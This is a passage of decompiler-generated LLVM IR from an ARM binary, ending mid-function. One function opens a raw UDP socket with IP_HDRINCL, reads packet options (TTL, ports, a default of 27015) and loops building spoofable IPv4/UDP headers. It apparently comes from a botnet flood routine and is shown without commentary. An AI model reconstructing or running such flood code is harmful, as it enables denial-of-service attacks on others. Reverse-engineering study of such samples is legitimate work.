  %v1_f0f0 = trunc i32 %v0_f0f0 to i8
  %v2_f0f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_f0f0 = add i32 %v2_f0f0, 7
  %v4_f0f0 = inttoptr i32 %v3_f0f0 to i8*
  store i8 %v1_f0f0, i8* %v4_f0f0, align 1
  %v0_f0f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f0f4 = trunc i32 %v0_f0f4 to i8
  %v2_f0f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_f0f4 = add i32 %v2_f0f4, 20
  %v4_f0f4 = inttoptr i32 %v3_f0f4 to i8*
  store i8 %v1_f0f4, i8* %v4_f0f4, align 1
  store i32 %v3_f02833, i32* %r0.global-to-local, align 4
  store i32 %v4_f0fc, i32* %r1.global-to-local, align 4
  %v2_f100 = load i32, i32* %r3.global-to-local, align 4
  %v3_f100 = add i32 %v2_f100, 5
  %v4_f100 = inttoptr i32 %v3_f100 to i8*
  store i8 %v5_f03c, i8* %v4_f100, align 1
  %v0_f104 = load i32, i32* %r1.global-to-local, align 4
  %v1_f104 = trunc i32 %v0_f104 to i8
  %v2_f104 = load i32, i32* %r3.global-to-local, align 4
  %v3_f104 = add i32 %v2_f104, 1
  %v4_f104 = inttoptr i32 %v3_f104 to i8*
  store i8 %v1_f104, i8* %v4_f104, align 1
  %v0_f108 = load i32, i32* %r5.global-to-local, align 4
  %v1_f108 = trunc i32 %v0_f108 to i8
  %v2_f108 = load i32, i32* %r3.global-to-local, align 4
  %v3_f108 = add i32 %v2_f108, 2
  %v4_f108 = inttoptr i32 %v3_f108 to i8*
  store i8 %v1_f108, i8* %v4_f108, align 1
  store i32 %v4_f10c, i32* %r2.global-to-local, align 4
  %v0_f110 = load i32, i32* %r6.global-to-local, align 4
  %v1_f110 = load i32, i32* @sl, align 4
  %v9_f110 = icmp eq i32 %v0_f110, %v1_f110
  store i1 %v9_f110, i1* %cpsr_z.global-to-local, align 1
  %v2_f114 = load i32, i32* %r3.global-to-local, align 4
  %v3_f114 = add i32 %v2_f114, 3
  %v4_f114 = inttoptr i32 %v3_f114 to i8*
  store i8 %v1_f114, i8* %v4_f114, align 1
  %v0_f118 = load i32, i32* %r7.global-to-local, align 4
  %v1_f118 = trunc i32 %v0_f118 to i8
  %v2_f118 = load i32, i32* %r3.global-to-local, align 4
  %v3_f118 = add i32 %v2_f118, 4
  %v4_f118 = inttoptr i32 %v3_f118 to i8*
  store i8 %v1_f118, i8* %v4_f118, align 1
  %v0_f11c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_f11c, i32* %stack_var_-40, align 4
  %v5_f120 = icmp slt i32 %v0_f110, %v1_f110
  br i1 %v5_f120, label %dec_label_pc_f044, label %dec_label_pc_ede4

; uselistorder directives
  uselistorder i32 %v3_f02833, { 2, 0, 1 }
  uselistorder i32 %v3_f01c, { 1, 0 }
  uselistorder i32 %v3_f018, { 1, 0 }
  uselistorder i32 %v7_f014, { 1, 0 }
  uselistorder i32 %v4_efdc, { 1, 0 }
  uselistorder i32 %v0_efd4, { 0, 2, 1 }
  uselistorder i32 %v0_efb8, { 0, 2, 1 }
  uselistorder i32 %v4_efa4, { 1, 0 }
  uselistorder i32 %v0_ef9c, { 0, 2, 1 }
  uselistorder i32 %v2_ef70, { 1, 0 }
  uselistorder i32 %v8_ef50, { 2, 0, 1, 3 }
  uselistorder i32 %v3_ef3c, { 1, 0 }
  uselistorder i32 %v3_ef18, { 1, 3, 2, 0, 4 }
  uselistorder i1 %v2_ef0c, { 1, 0 }
  uselistorder i32 %v1_ef00, { 1, 2, 3, 0 }
  uselistorder i32 %v1_eefc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_eea4, { 0, 2, 1 }
  uselistorder i32 %v0_ee8c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_ee78, { 1, 0 }
  uselistorder i32 %v2_ee74, { 0, 2, 1 }
  uselistorder i1 %v7_ee24, { 2, 1, 0 }
  uselistorder i1 %v3_ef90, { 1, 0, 2, 3 }
  uselistorder i8 %v5_ecd4, { 0, 2, 1 }
  uselistorder i32 %v3_ecc0, { 1, 0 }
  uselistorder i32 %v1_ecb0, { 2, 3, 0, 1 }
  uselistorder i32 %v1_ecac, { 1, 2, 0 }
  uselistorder i32 %v1_eca4, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_ec9c, { 1, 0 }
  uselistorder i32 %v1_ec74, { 2, 1, 0, 3 }
  uselistorder i32 %v3_ec54, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v3_ec50, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ec3c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_ec34, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ec30, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_ec2c, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v3_ec20, { 3, 1, 2, 0 }
  uselistorder i1 %v7_ec0c, { 1, 0 }
  uselistorder i1 %v7_ebe0, { 1, 0 }
  uselistorder i32 %v3_ebdc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_ebc8, { 2, 1, 7, 5, 0, 6, 4, 3 }
  uselistorder i32 %v1_ebb4, { 3, 1, 2, 0 }
  uselistorder i32 %v1_eb40, { 1, 0 }
  uselistorder i8 %v5_eb30, { 1, 0, 2 }
  uselistorder i32 %v5_eb14, { 1, 0 }
  uselistorder i8 %v5_eaf8, { 0, 2, 1 }
  uselistorder i32 %v6_ead8, { 1, 0 }
  uselistorder i32 %v2_eac0, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 %v1_eaa4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 22, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 50, 52, 51, 53, 54, 25, 55, 27, 26, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 9, 7, 8, 11, 10, 13, 12, 14, 15, 16, 18, 17, 20, 19, 21, 1, 24, 2, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 22, 23, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 9 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_f008, { 1, 0 }
  uselistorder label %dec_label_pc_eff0, { 1, 0 }
  uselistorder label %dec_label_pc_ee64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_edec, { 1, 0 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
}

define i32 @function_f12c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f12c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_f12c = load i32, i32* @r4, align 4
  %v6_f12c = load i32, i32* @r5, align 4
  %v9_f12c = load i32, i32* @r6, align 4
  %v12_f12c = load i32, i32* @r7, align 4
  %v1_f130 = urem i32 %arg1, 256
  store i32 %v1_f130, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @sl, align 4
  %v1_f144 = urem i32 %arg3, 256
  store i32 %v1_f144, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_f14c = call i32 @_calloc(i32 %v1_f130, i32 4)
  %v0_f150 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f15c = load i32, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_f164 = inttoptr i32 %v0_f150 to i32*
  %v6_f164 = call i32 @function_b240(i32 %v0_f15c, i32* %v5_f164, i32 2, i32 0)
  %v1_f170 = urem i32 %v6_f164, 256
  store i32 %v1_f170, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_f17c = load i32, i32* @r4, align 4
  %v0_f180 = load i32, i32* @r5, align 4
  %v5_f184 = trunc i32 %v6_f164 to i8
  %v6_f188 = inttoptr i32 %v0_f180 to i32*
  %v7_f188 = call i32 @function_b240(i32 %v0_f17c, i32* %v6_f188, i32 3, i32 65535)
  %v0_f18c = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_f188, i32* @r7, align 4
  %v0_f19c = load i32, i32* @r4, align 4
  %v4_f1a0 = inttoptr i32 %v0_f18c to i32*
  %v5_f1a0 = call i32 @function_b240(i32 %v0_f19c, i32* %v4_f1a0, i32 4, i32 64)
  %v1_f1a8 = urem i32 %v5_f1a0, 256
  store i32 %v1_f1a8, i32* %ip.global-to-local, align 4
  %v0_f1ac = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f1b8 = load i32, i32* @r4, align 4
  %v5_f1bc = trunc i32 %v5_f1a0 to i8
  %v6_f1c0 = inttoptr i32 %v0_f1ac to i32*
  %v7_f1c0 = call i32 @function_b240(i32 %v0_f1b8, i32* %v6_f1c0, i32 5, i32 0)
  %v1_f1cc = urem i32 %v7_f1c0, 256
  store i32 %v1_f1cc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_f1d8 = load i32, i32* @r4, align 4
  %v0_f1dc = load i32, i32* @r5, align 4
  %v5_f1e4 = inttoptr i32 %v0_f1dc to i32*
  %v6_f1e4 = call i32 @function_b240(i32 %v0_f1d8, i32* %v5_f1e4, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_f1f4 = load i32, i32* @r5, align 4
  store i32 %v6_f1e4, i32* @r6, align 4
  %v0_f1fc = load i32, i32* @r4, align 4
  %v4_f200 = inttoptr i32 %v0_f1f4 to i32*
  %v5_f200 = call i32 @function_b240(i32 %v0_f1fc, i32* %v4_f200, i32 7, i32 27015)
  store i32 %v5_f200, i32* @r4, align 4
  %v1_f20c = call i32 @function_13ce8(i32 29)
  %v3_f218 = call i32 @function_13c04(i32 29, i32* nonnull %stack_var_-44)
  store i32 %v3_f218, i32* %r8.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_f22c = call i32 @_socket(i32 2, i32 3, i32 17)
  %v7_f230 = icmp eq i32 %v3_f22c, -1
  store i1 %v7_f230, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f22c, i32* %fp.global-to-local, align 4
  br i1 %v7_f230, label %dec_label_pc_f5e4, label %dec_label_pc_f23c

dec_label_pc_f23c:                                ; preds = %dec_label_pc_f12c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_f244 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_f244, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_f258 = call i32 @_setsockopt(i32 %v3_f22c, i32 0, i32 3, i32 %v6_f244, i32 ptrtoint (i32* @0 to i32))
  %v7_f25c = icmp eq i32 %v5_f258, -1
  store i1 %v7_f25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f25c, label %dec_label_pc_f5dc, label %dec_label_pc_f264

dec_label_pc_f264:                                ; preds = %dec_label_pc_f23c
  %v0_f264 = load i32, i32* @r4, align 4
  %v3_f264 = mul i32 %v0_f264, 65536
  store i32 %v3_f264, i32* %lr.global-to-local, align 4
  %v0_f268 = load i32, i32* @r7, align 4
  %v0_f26c = load i32, i32* @r6, align 4
  %v3_f26c = mul i32 %v0_f26c, 65536
  store i32 %v3_f26c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_f274 = urem i32 %v0_f268, 65536
  %v3_f278 = urem i32 %v0_f26c, 65536
  store i32 %v3_f278, i32* %r2.global-to-local, align 4
  %v3_f27c = urem i32 %v0_f264, 65536
  store i32 %v3_f27c, i32* %r3.global-to-local, align 4
  %v0_f280 = load i32, i32* %sb.global-to-local, align 4
  %v2_f280 = icmp eq i32 %v0_f280, 0
  store i1 %v2_f280, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp50 = icmp slt i32 %v0_f280, 1
  br i1 %tmp50, label %dec_label_pc_f404, label %dec_label_pc_f298

dec_label_pc_f298:                                ; preds = %dec_label_pc_f264
  %v1_f29c = urem i32 %v0_f264, 256
  %v1_f2a0 = urem i32 %v0_f268, 256
  %v3_f2a4 = mul nuw nsw i32 %v1_f29c, 256
  %v1_f2a8 = urem i32 %v0_f26c, 256
  %tmp51 = udiv i32 %v0_f268, 256
  %v3_f2ac = urem i32 %tmp51, 256
  %tmp52 = udiv i32 %v0_f26c, 256
  %v3_f2b0 = urem i32 %tmp52, 256
  store i32 %v3_f2b0, i32* %ip.global-to-local, align 4
  %v4_f2b4 = mul nuw nsw i32 %v1_f2a0, 256
  %v5_f2b4 = or i32 %v4_f2b4, %v3_f2ac
  store i32 %v5_f2b4, i32* %r7.global-to-local, align 4
  %v4_f2b8 = mul nuw nsw i32 %v1_f2a8, 256
  %v5_f2b8 = or i32 %v4_f2b8, %v3_f2b0
  store i32 %v5_f2b8, i32* %r6.global-to-local, align 4
  %tmp53 = udiv i32 %v0_f264, 256
  %v4_f2bc = urem i32 %tmp53, 256
  %v5_f2bc = or i32 %v4_f2bc, %v3_f2a4
  store i32 %v5_f2bc, i32* %r5.global-to-local, align 4
  store i32 %v1_f2a8, i32* %r2.global-to-local, align 4
  store i32 %v1_f29c, i32* %r3.global-to-local, align 4
  %v2_f338 = icmp eq i32 %v1_f1cc, 0
  %v4_f33c = sext i8 %v5_f1bc to i32
  %sext = mul i32 %v0_f268, 16777216
  %v4_f358 = sdiv i32 %sext, 16777216
  %sext6 = mul i32 %v0_f26c, 16777216
  %v4_f3b4 = sdiv i32 %sext6, 16777216
  %sext7 = mul i32 %v0_f264, 16777216
  %v4_f3d4 = sdiv i32 %sext7, 16777216
  br label %dec_label_pc_f2d8

dec_label_pc_f2d8:                                ; preds = %bb57, %dec_label_pc_f298
  %v2_f2e0 = call i32 @_calloc(i32 128, i32 1)
  store i32 %v2_f14c, i32* %r2.global-to-local, align 4
  %v3_f2e8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f2e8, i32* %r3.global-to-local, align 4
  %v2_f2ec = load i32, i32* @r4, align 4
  %v5_f2ec = mul i32 %v2_f2ec, 4
  %v6_f2ec = add i32 %v5_f2ec, %v2_f14c
  %v7_f2ec = inttoptr i32 %v6_f2ec to i32*
  store i32 %v2_f2e0, i32* %v7_f2ec, align 4
  %v0_f2f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f2f0 = load i32, i32* %r3.global-to-local, align 4
  %v4_f2f0 = mul i32 %v1_f2f0, 4
  %v5_f2f0 = add i32 %v4_f2f0, %v0_f2f0
  %v6_f2f0 = inttoptr i32 %v5_f2f0 to i32*
  %v7_f2f0 = load i32, i32* %v6_f2f0, align 4
  store i32 %v7_f2f0, i32* %lr.global-to-local, align 4
  %v1_f2f4 = inttoptr i32 %v7_f2f0 to i8*
  %v2_f2f4 = load i8, i8* %v1_f2f4, align 1
  %tmp = urem i8 %v2_f2f4, 16
  %v1_f2f8 = zext i8 %tmp to i32
  %v1_f2fc = or i32 %v1_f2f8, 64
  store i32 %v1_f2fc, i32* %r3.global-to-local, align 4
  %v1_f300 = trunc i32 %v1_f2fc to i8
  store i8 %v1_f300, i8* %v1_f2f4, align 1
  %v0_f304 = load i32, i32* %lr.global-to-local, align 4
  %v1_f304 = inttoptr i32 %v0_f304 to i8*
  %v2_f304 = load i8, i8* %v1_f304, align 1
  %v1_f308 = and i8 %v2_f304, -16
  %v1_f30c = or i8 %v1_f308, 5
  store i8 %v1_f30c, i8* %v1_f304, align 1
  %v2_f318 = load i32, i32* %lr.global-to-local, align 4
  %v3_f318 = add i32 %v2_f318, 1
  %v4_f318 = inttoptr i32 %v3_f318 to i8*
  store i8 %v5_f184, i8* %v4_f318, align 1
  %v3_f31c = load i32, i32* %stack_var_-44, align 4
  %v1_f320 = add i32 %v3_f31c, 32
  %tmp54 = mul i32 %v1_f320, 256
  %v1_f32c = and i32 %tmp54, 65280
  %tmp55 = udiv i32 %v1_f320, 256
  %v4_f330 = urem i32 %tmp55, 256
  %v5_f330 = or i32 %v4_f330, %v1_f32c
  store i32 %v5_f330, i32* %r2.global-to-local, align 4
  store i1 %v2_f338, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_f33c, i32* %r3.global-to-local, align 4
  %v2_f340 = load i32, i32* %lr.global-to-local, align 4
  %v3_f340 = add i32 %v2_f340, 8
  %v4_f340 = inttoptr i32 %v3_f340 to i8*
  store i8 %v5_f1bc, i8* %v4_f340, align 1
  %v0_f344 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f344, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_f2d8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_f348 = load i32, i32* %lr.global-to-local, align 4
  %v4_f348 = add i32 %v3_f348, 6
  %v5_f348 = inttoptr i32 %v4_f348 to i8*
  store i8 64, i8* %v5_f348, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f2d8, %bb
  %v0_f34c = load i32, i32* %r2.global-to-local, align 4
  %v1_f34c = trunc i32 %v0_f34c to i8
  %v2_f34c = load i32, i32* %lr.global-to-local, align 4
  %v3_f34c = add i32 %v2_f34c, 2
  %v4_f34c = inttoptr i32 %v3_f34c to i8*
  store i8 %v1_f34c, i8* %v4_f34c, align 1
  %v0_f350 = load i32, i32* %r2.global-to-local, align 4
  %v3_f350 = sdiv i32 %v0_f350, 256
  store i32 %v3_f350, i32* %ip.global-to-local, align 4
  store i32 %v4_f358, i32* %r2.global-to-local, align 4
  %v2_f35c = load i32, i32* %lr.global-to-local, align 4
  %v3_f35c = add i32 %v2_f35c, 9
  %v4_f35c = inttoptr i32 %v3_f35c to i8*
  store i8 17, i8* %v4_f35c, align 1
  store i32 ptrtoint (i32* @global_var_1d9ac.143 to i32), i32* %r3.global-to-local, align 4
  %v0_f364 = load i32, i32* %r2.global-to-local, align 4
  %v1_f364 = trunc i32 %v0_f364 to i8
  %v2_f364 = load i32, i32* %lr.global-to-local, align 4
  %v3_f364 = add i32 %v2_f364, 5
  %v4_f364 = inttoptr i32 %v3_f364 to i8*
  store i8 %v1_f364, i8* %v4_f364, align 1
  %v0_f368 = load i32, i32* %ip.global-to-local, align 4
  %v1_f368 = trunc i32 %v0_f368 to i8
  %v2_f368 = load i32, i32* %lr.global-to-local, align 4
  %v3_f368 = add i32 %v2_f368, 3
  %v4_f368 = inttoptr i32 %v3_f368 to i8*
  store i8 %v1_f368, i8* %v4_f368, align 1
  %v0_f36c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f36c, label %.thread8, label %bb56

.thread8:                                         ; preds = %.thread
  %v3_f3709 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f3709, i32* %ip.global-to-local, align 4
  br label %bb57

bb56:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f370 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f370, i32* %ip.global-to-local, align 4
  %v3_f374 = load i32, i32* %lr.global-to-local, align 4
  %v4_f374 = add i32 %v3_f374, 7
  %v5_f374 = inttoptr i32 %v4_f374 to i8*
  store i8 0, i8* %v5_f374, align 1
  %v0_f37c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %bb56
  %v0_f37c = phi i32 [ %v3_f3709, %.thread8 ], [ %v0_f37c.pre, %bb56 ]
  %v2_f378 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_f378, i32* %r2.global-to-local, align 4
  %v3_f37c = mul i32 %v0_f37c, 32
  store i32 %v3_f37c, i32* %r3.global-to-local, align 4
  %v1_f380 = load i32, i32* %lr.global-to-local, align 4
  %v2_f380 = add i32 %v1_f380, 12
  %v3_f380 = inttoptr i32 %v2_f380 to i32*
  store i32 %v2_f378, i32* %v3_f380, align 4
  %v0_f384 = load i32, i32* %r3.global-to-local, align 4
  %v1_f384 = load i32, i32* %ip.global-to-local, align 4
  %tmp60 = mul i32 %v1_f384, -8
  %v5_f384 = add i32 %v0_f384, %tmp60
  %v1_f388 = load i32, i32* @sl, align 4
  %v2_f388 = add i32 %v5_f384, %v1_f388
  store i32 %v2_f388, i32* %r3.global-to-local, align 4
  %v1_f38c = add i32 %v2_f388, 16
  %v2_f38c = inttoptr i32 %v1_f38c to i32*
  %v3_f38c = load i32, i32* %v2_f38c, align 4
  %v1_f390 = load i32, i32* %lr.global-to-local, align 4
  %v2_f390 = add i32 %v1_f390, 16
  %v3_f390 = inttoptr i32 %v2_f390 to i32*
  store i32 %v3_f38c, i32* %v3_f390, align 4
  %v3_f394 = load i32, i32* %stack_var_-44, align 4
  %v1_f398 = add i32 %v3_f394, 12
  %tmp58 = mul i32 %v1_f398, 256
  %v1_f3a8 = and i32 %tmp58, 65280
  %tmp59 = udiv i32 %v1_f398, 256
  %v4_f3ac = urem i32 %tmp59, 256
  %v5_f3ac = or i32 %v4_f3ac, %v1_f3a8
  store i32 %v5_f3ac, i32* %ip.global-to-local, align 4
  %v1_f3b0 = load i32, i32* %lr.global-to-local, align 4
  %v2_f3b0 = add i32 %v1_f3b0, 28
  %v3_f3b0 = inttoptr i32 %v2_f3b0 to i32*
  store i32 -1, i32* %v3_f3b0, align 4
  store i32 %v4_f3b4, i32* %r2.global-to-local, align 4
  %v0_f3b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_f3b8 = add i32 %v0_f3b8, 20
  store i32 %v1_f3b8, i32* %r4.global-to-local, align 4
  %v0_f3bc = load i32, i32* %ip.global-to-local, align 4
  %v3_f3bc = sdiv i32 %v0_f3bc, 256
  store i32 %v3_f3bc, i32* %r3.global-to-local, align 4
  %v0_f3c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f3c0 = trunc i32 %v0_f3c0 to i8
  %v3_f3c0 = add i32 %v0_f3b8, 4
  %v4_f3c0 = inttoptr i32 %v3_f3c0 to i8*
  store i8 %v1_f3c0, i8* %v4_f3c0, align 1
  %v0_f3c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_f3c4 = trunc i32 %v0_f3c4 to i8
  %v2_f3c4 = load i32, i32* %lr.global-to-local, align 4
  %v3_f3c4 = add i32 %v2_f3c4, 20
  %v4_f3c4 = inttoptr i32 %v3_f3c4 to i8*
  store i8 %v1_f3c4, i8* %v4_f3c4, align 1
  %v0_f3c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_f3c8 = trunc i32 %v0_f3c8 to i8
  %v2_f3c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_f3c8 = add i32 %v2_f3c8, 5
  %v4_f3c8 = inttoptr i32 %v3_f3c8 to i8*
  store i8 %v1_f3c8, i8* %v4_f3c8, align 1
  %v0_f3cc = load i32, i32* %r5.global-to-local, align 4
  %v1_f3cc = trunc i32 %v0_f3cc to i8
  %v2_f3cc = load i32, i32* %r4.global-to-local, align 4
  %v3_f3cc = add i32 %v2_f3cc, 2
  %v4_f3cc = inttoptr i32 %v3_f3cc to i8*
  store i8 %v1_f3cc, i8* %v4_f3cc, align 1
  %v0_f3d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f3d0 = trunc i32 %v0_f3d0 to i8
  %v2_f3d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_f3d0 = add i32 %v2_f3d0, 1
  %v4_f3d0 = inttoptr i32 %v3_f3d0 to i8*
  store i8 %v1_f3d0, i8* %v4_f3d0, align 1
  store i32 %v4_f3d4, i32* %r3.global-to-local, align 4
  %v0_f3d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_f3d8 = trunc i32 %v0_f3d8 to i8
  %v2_f3d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_f3d8 = add i32 %v2_f3d8, 4
  %v4_f3d8 = inttoptr i32 %v3_f3d8 to i8*
  store i8 %v1_f3d8, i8* %v4_f3d8, align 1
  %v0_f3dc = load i32, i32* %r3.global-to-local, align 4
  %v1_f3dc = trunc i32 %v0_f3dc to i8
  %v2_f3dc = load i32, i32* %r4.global-to-local, align 4
  %v3_f3dc = add i32 %v2_f3dc, 3
  %v4_f3dc = inttoptr i32 %v3_f3dc to i8*
  store i8 %v1_f3dc, i8* %v4_f3dc, align 1
  %v0_f3e0 = load i32, i32* %r8.global-to-local, align 4
  %v0_f3e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_f3e4 = add i32 %v0_f3e4, 32
  %v3_f3e8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f3e8, i32* %r2.global-to-local, align 4
  %v3_f3ec = call i32 @function_14688(i32 %v1_f3e4, i32 %v0_f3e0, i32 %v3_f3e8)
  %v3_f3f0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f3f0, i32* %r3.global-to-local, align 4
  %v1_f3f4 = add i32 %v3_f3f0, 1
  store i32 %v1_f3f4, i32* @r4, align 4
  %v1_f3f8 = load i32, i32* %sb.global-to-local, align 4
  %v9_f3f8 = icmp eq i32 %v1_f3f4, %v1_f3f8
  store i1 %v9_f3f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f3f4, i32* %stack_var_-40, align 4
  %v5_f400 = icmp slt i32 %v1_f3f4, %v1_f3f8
  br i1 %v5_f400, label %dec_label_pc_f2d8, label %dec_label_pc_f404

dec_label_pc_f404:                                ; preds = %bb57, %dec_label_pc_f264
  %v0_f404 = phi i32 [ %v0_f280, %dec_label_pc_f264 ], [ %v1_f3f8, %bb57 ]
  %v2_f404 = icmp eq i32 %v0_f404, 0
  store i1 %v2_f404, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f44c = icmp eq i32 %v3_f274, 65535
  br label %dec_label_pc_f40c.outer

dec_label_pc_f40c.outer:                          ; preds = %dec_label_pc_f51c, %dec_label_pc_f404
  %v1_f40c.ph.in = phi i32 [ %v1_f510, %dec_label_pc_f51c ], [ %v0_f404, %dec_label_pc_f404 ]
  %v0_f40c.ph = phi i1 [ %v2_f51c, %dec_label_pc_f51c ], [ %v2_f404, %dec_label_pc_f404 ]
  %v1_f40c.ph = icmp slt i32 %v1_f40c.ph.in, 0
  %v4_f40c = or i1 %v1_f40c.ph, %v0_f40c.ph
  br label %dec_label_pc_f40c

dec_label_pc_f40c:                                ; preds = %dec_label_pc_f40c.outer, %dec_label_pc_f40c
  br i1 %v4_f40c, label %dec_label_pc_f40c, label %dec_label_pc_f410

dec_label_pc_f410:                                ; preds = %dec_label_pc_f40c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_f41c

dec_label_pc_f41c:                                ; preds = %dec_label_pc_f46c, %dec_label_pc_f410
  %v1_f430 = phi i32 [ %v1_f50c, %dec_label_pc_f46c ], [ 0, %dec_label_pc_f410 ]
  %v5_f420 = mul i32 %v1_f430, 24
  %v1_f424 = load i32, i32* @sl, align 4
  %v2_f424 = add i32 %v1_f424, %v5_f420
  store i32 %v2_f424, i32* %r3.global-to-local, align 4
  %v1_f42c = add i32 %v2_f424, 20
  %v2_f42c = inttoptr i32 %v1_f42c to i8*
  %v3_f42c = load i8, i8* %v2_f42c, align 1
  %v4_f42c = zext i8 %v3_f42c to i32
  store i32 %v4_f42c, i32* %r2.global-to-local, align 4
  %v4_f430 = mul i32 %v1_f430, 4
